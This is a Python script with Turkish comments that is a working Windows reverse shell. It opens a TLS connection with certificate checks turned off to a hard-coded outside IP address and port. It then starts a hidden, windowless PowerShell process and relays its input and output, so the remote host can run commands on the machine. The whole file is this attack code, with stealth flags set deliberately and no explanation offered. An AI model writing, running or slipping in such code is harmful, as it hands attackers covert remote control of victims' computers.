import socket
import ssl
import subprocess
import threading
import os
import sys

def handle_outputs(proc_stream, ssl_socket):
    """Sürecin çıktılarını (stdout/stderr) okur ve anında sokete basar."""
    while True:
        try:
            # Satır satır okuma yaparak tamponlama kilidini kırıyoruz
            line = proc_stream.readline()
            if not line:
                break
            ssl_socket.send(line)
        except:
            break

def connect_back():
    h = '185.194.175.132'
    p = 7001
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        ssls = ctx.wrap_socket(s, server_hostname='lab-manager')
        ssls.connect((h, p))
        
        computer_name = os.environ.get("COMPUTERNAME", "PC")
        ssls.send(f"--- Interaktif Oturum Basladi: {computer_name} ---\nPS> ".encode())
        
        # Windows penceresini tamamen görünmez kılma bayrakları
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        
        # CMD yerine PowerShell kullanarak girdi/çıktı senkronizasyonunu garantiye alıyoruz
        proc = subprocess.Popen(
            ['powershell.exe', '-NoExit', '-Command', '-'],
            startupinfo=si,
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            bufsize=0 # Tamponlamayı sıfırlıyoruz
        )
        
        # Çıktıları izlemek için thread'leri başlatıyoruz
        t1 = threading.Thread(target=handle_outputs, args=(proc.stdout, ssls))
        t2 = threading.Thread(target=handle_outputs, args=(proc.stderr, ssls))
        t1.daemon = True
        t2.daemon = True
        t1.start()
        t2.start()
        
        # Soketten gelen girdileri sürece aktarma
        while True:
            data = ssls.recv(1024)
            if not data:
                break
            proc.stdin.write(data)
            proc.stdin.flush() # Veriyi Windows'a zorla ittiriyoruz
            
    except:
        pass
    finally:
        try: s.close()
        except: pass

if __name__ == "__main__":
    connect_back()
